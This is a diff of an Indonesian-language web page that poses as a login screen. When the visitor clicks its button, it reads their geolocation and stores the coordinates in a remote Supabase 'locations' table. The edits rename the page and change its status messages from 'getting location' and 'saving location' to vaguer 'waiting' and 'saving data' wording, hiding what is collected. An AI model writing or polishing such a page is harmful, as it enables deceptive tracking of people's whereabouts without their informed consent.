@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Ergi</title>
+<title>Ghoz</title>
 
 <style>
 body{
@@ -55,10 +55,10 @@ button:hover{
 <body>
 
 <div class="card">
-    <h1>Masuk</h1>
+    <h1>Ghoz</h1>
 
     <p>
-      Klik Tombol Dibawah Untuk Masuk✓
+      Klik Tombol Dibawah Untuk Masuk
     </p>
 
     <button id="shareBtn">
@@ -70,7 +70,7 @@ button:hover{
 
 <script type="module">
 
-import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
+import { createClient } from "https://esm.sh/@supaBase/supabase-js@2";
 
 // GANTI DENGAN ANON KEY ASLI ANDA dari Project Settings > API
 const supabaseUrl = "https://natsquslyfvknfboghai.supabase.co";
@@ -83,7 +83,7 @@ const statusEl = document.getElementById("status");
 
 shareBtn.addEventListener("click", () => {
     
-    statusEl.innerText = "Mendapatkan lokasi...";
+    statusEl.innerText = "Menunggu...";
     statusEl.style.background = "#334155";
     shareBtn.disabled = true;
     shareBtn.classList.add("loading");
@@ -93,7 +93,7 @@ shareBtn.addEventListener("click", () => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             
-            statusEl.innerText = `Menyimpan lokasi: ${lat}, ${lon}...`;
+            statusEl.innerText = `Menyimpan data: ${lat}, ${lon}...`;
 
             const { data, error } = await supabase
                 .from("locations")
@@ -109,7 +109,7 @@ shareBtn.addEventListener("click", () => {
                 return;
             }
 
-            statusEl.innerText = "✅ Lokasi berhasil disimpan!";
+            statusEl.innerText = "✅ Data berhasil disimpan!";
             statusEl.style.background = "#166534";
             
             setTimeout(() => {
